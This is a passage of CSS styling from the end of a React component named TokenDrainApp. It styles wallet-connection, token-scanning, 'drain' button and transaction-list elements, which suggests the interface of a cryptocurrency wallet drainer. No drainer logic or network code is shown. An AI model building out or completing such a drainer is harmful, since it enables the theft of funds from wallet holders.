        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.1); }
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 700;
          color: #ef4444;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .wallet-info {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .wallet-address {
          background: #222;
          padding: 8px 12px;
          border-radius: 8px;
          font-family: monospace;
          font-size: 14px;
          border: 1px solid #333;
        }
        
        .wallet-type {
          font-size: 12px;
          color: #0af;
          padding: 4px 8px;
          background: rgba(0, 170, 255, 0.1);
          border-radius: 6px;
          border: 1px solid rgba(0, 170, 255, 0.3);
        }
        
        .mobile-badge {
          background: rgba(0, 100, 255, 0.2);
          color: #3b82f6;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          border: 1px solid rgba(0, 100, 255, 0.3);
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 12px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
          transition: background 0.3s;
        }
        
        .disconnect-btn:hover {
          background: #555;
        }
        
        /* Status Dashboard */
        .status-dashboard {
          margin-bottom: 30px;
        }
        
        .status-card {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 2px solid #333;
          margin-bottom: 20px;
        }
        
        .status-card.primary {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-color: #ef4444;
        }
        
        .status-icon {
          font-size: 32px;
        }
        
        .status-content {
          flex: 1;
        }
        
        .status-title {
          font-size: 14px;
          color: #aaa;
          text-transform: uppercase;
          letter-spacing: 2px;
          margin-bottom: 5px;
        }
        
        .status-message {
          font-size: 18px;
          font-weight: 600;
          color: white;
        }
        
        .stats-row {
          display: flex;
          gap: 15px;
        }
        
        .stat {
          flex: 1;
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          border: 1px solid #333;
          transition: transform 0.3s;
        }
        
        .stat:hover {
          transform: translateY(-2px);
          border-color: #444;
        }
        
        .stat-value {
          font-size: 28px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Controls */
        .controls-container {
          display: flex;
          gap: 15px;
          margin-bottom: 30px;
        }
        
        .btn {
          flex: 1;
          padding: 16px 24px;
          border: none;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
        }
        
        .btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .btn-scan {
          background: linear-gradient(135deg, #1e40af, #3b82f6);
          color: white;
        }
        
        .btn-scan:hover:not(:disabled) {
          background: linear-gradient(135deg, #1e3a8a, #2563eb);
          transform: translateY(-2px);
          box-shadow: 0 5px 15px rgba(59, 130, 246, 0.3);
        }
        
        .btn-drain {
          background: linear-gradient(135deg, #dc2626, #ef4444);
          color: white;
        }
        
        .btn-drain:hover:not(:disabled) {
          background: linear-gradient(135deg, #b91c1c, #dc2626);
          transform: translateY(-2px);
          box-shadow: 0 5px 15px rgba(239, 68, 68, 0.3);
        }
        
        .btn-refresh {
          background: linear-gradient(135deg, #047857, #10b981);
          color: white;
        }
        
        .btn-refresh:hover:not(:disabled) {
          background: linear-gradient(135deg, #065f46, #059669);
          transform: translateY(-2px);
        }
        
        /* Tokens Panel */
        .tokens-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
          padding-bottom: 15px;
          border-bottom: 1px solid #333;
        }
        
        .panel-header h3 {
          margin: 0;
          font-size: 18px;
          color: white;
        }
        
        .total-value {
          font-size: 18px;
          font-weight: 700;
          color: #10b981;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
          gap: 15px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          border: 1px solid #333;
          transition: all 0.3s;
        }
        
        .token-card:hover {
          border-color: #444;
          transform: translateY(-2px);
          box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        .token-header {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 10px;
        }
        
        .token-symbol {
          font-weight: 700;
          font-size: 20px;
          color: white;
        }
        
        .token-network {
          color: #888;
          font-size: 12px;
          flex: 1;
        }
        
        .token-type {
          padding: 2px 8px;
          border-radius: 4px;
          font-size: 10px;
          font-weight: 600;
          text-transform: uppercase;
        }
        
        .token-type.evm {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
          border: 1px solid rgba(59, 130, 246, 0.3);
        }
        
        .token-type.non-evm {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
          border: 1px solid rgba(239, 68, 68, 0.3);
        }
        
        .token-amount {
          font-size: 24px;
          font-weight: 700;
          color: white;
          margin-bottom: 5px;
        }
        
        .token-value {
          color: #10b981;
          font-size: 18px;
          font-weight: 600;
          margin-bottom: 10px;
        }
        
        .token-status .status-auto {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          font-weight: 600;
          border: 1px solid rgba(239, 68, 68, 0.3);
        }
        
        /* Transactions Panel */
        .transactions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .transactions-list {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }
        
        .transaction-item {
          display: flex;
          align-items: center;
          padding: 12px;
          background: #1a1a1a;
          border-radius: 8px;
          border: 1px solid #333;
        }
        
        .tx-symbol {
          font-weight: 600;
          color: #ef4444;
          width: 60px;
        }
        
        .tx-amount {
          flex: 1;
          font-family: monospace;
        }
        
        .tx-hash {
          font-family: monospace;
          color: #888;
          font-size: 12px;
          width: 100px;
        }
        
        .tx-time {
          color: #888;
          font-size: 12px;
          width: 80px;
          text-align: right;
        }
        
        /* Error Alert */
        .error-alert {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 20px;
          border: 2px solid #ef4444;
          animation: pulse-alert 2s infinite;
        }
        
        @keyframes pulse-alert {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.8; }
        }
        
        .error-icon {
          font-size: 24px;
        }
        
        .error-message {
          flex: 1;
          color: white;
          font-size: 14px;
        }
        
        /* Welcome Screen */
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 800px;
          margin: 0 auto;
        }
        
        .welcome-icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #ddd;
          margin-bottom: 30px;
          font-size: 18px;
          line-height: 1.6;
        }
        
        .network-stats {
          display: flex;
          justify-content: center;
          gap: 40px;
          margin-top: 40px;
        }
        
        .stat-item {
          text-align: center;
        }
        
        .stat-number {
          font-size: 36px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        .supported-chains {
          margin-top: 40px;
          padding: 20px;
          background: #222;
          border-radius: 12px;
        }
        
        .supported-chains h4 {
          margin: 0 0 15px 0;
          color: #ddd;
          font-size: 16px;
        }
        
        .chains-grid {
          display: flex;
          flex-wrap: wrap;
          gap: 10px;
          justify-content: center;
        }
        
        .chain-badge {
          padding: 6px 12px;
          background: #333;
          border-radius: 6px;
          font-size: 12px;
          font-weight: 600;
          border: 1px solid #444;
        }
        
        .chain-badge.more {
          color: #888;
          background: #2a2a2a;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
          text-align: center;
          color: #888;
          font-size: 14px;
        }
        
        .footer-content {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 15px;
          flex-wrap: wrap;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #10b981;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        /* Progress Bar */
        .scan-progress {
          margin-top: 15px;
        }
        
        .progress-bar {
          height: 6px;
          background: #333;
          border-radius: 3px;
          overflow: hidden;
        }
        
        .progress-fill {
          height: 100%;
          background: linear-gradient(90deg, #3b82f6, #10b981);
          transition: width 0.3s;
        }
        
        .progress-text {
          font-size: 12px;
          color: #888;
          margin-top: 5px;
          text-align: right;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
          .app-header {
            flex-direction: column;
            gap: 20px;
            text-align: center;
          }
          
          .connected-wallet {
            flex-direction: column;
            gap: 10px;
          }
          
          .wallet-info {
            flex-wrap: wrap;
            justify-content: center;
          }
          
          .stats-row {
            flex-direction: column;
          }
          
          .controls-container {
            flex-direction: column;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
          
          .transaction-item {
            flex-wrap: wrap;
            gap: 8px;
          }
          
          .tx-symbol,
          .tx-hash,
          .tx-time {
            width: auto;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 5px;
          }
          
          .network-stats {
            gap: 20px;
          }
          
          .stat-number {
            font-size: 28px;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;
